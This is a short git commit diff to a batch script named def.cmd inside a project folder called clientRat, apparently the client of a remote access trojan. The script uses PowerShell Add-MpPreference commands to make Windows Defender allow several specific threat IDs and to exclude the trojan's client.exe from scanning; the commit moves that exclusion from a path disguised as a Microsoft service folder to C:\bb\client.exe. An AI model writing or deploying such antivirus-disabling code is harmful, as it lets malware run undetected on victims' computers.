d77359acee769ca1c4d040a98f5578a16f7b5245
Andrey <andrei.smirnikov@yandex.ru>
2021-02-11 00:39:13 +0400

    Update def.cmd

--- clientRat/def.cmd
+++ clientRat/def.cmd
@@ -10,7 +10,7 @@ Add-MpPreference -ThreatIDDefaultAction_Ids 2147743421 -ThreatIDDefaultAction_Ac
 Add-MpPreference -ThreatIDDefaultAction_Ids 251873 -ThreatIDDefaultAction_Actions Allow -Force; ^
 Add-MpPreference -ThreatIDDefaultAction_Ids 213927 -ThreatIDDefaultAction_Actions Allow -Force; ^
 Add-MpPreference -ThreatIDDefaultAction_Ids 2147722906 -ThreatIDDefaultAction_Actions Allow -Force; ^
-Add-MpPreference -ExclusionPath C:\ProgramData\Microsoft\WwanSvc\Profiles\client.exe -Force;
+Add-MpPreference -ExclusionPath C:\bb\client.exe -Force;
 
 :Admin
 reg query "HKU\S-1-5-19\Environment" >nul 2>&1
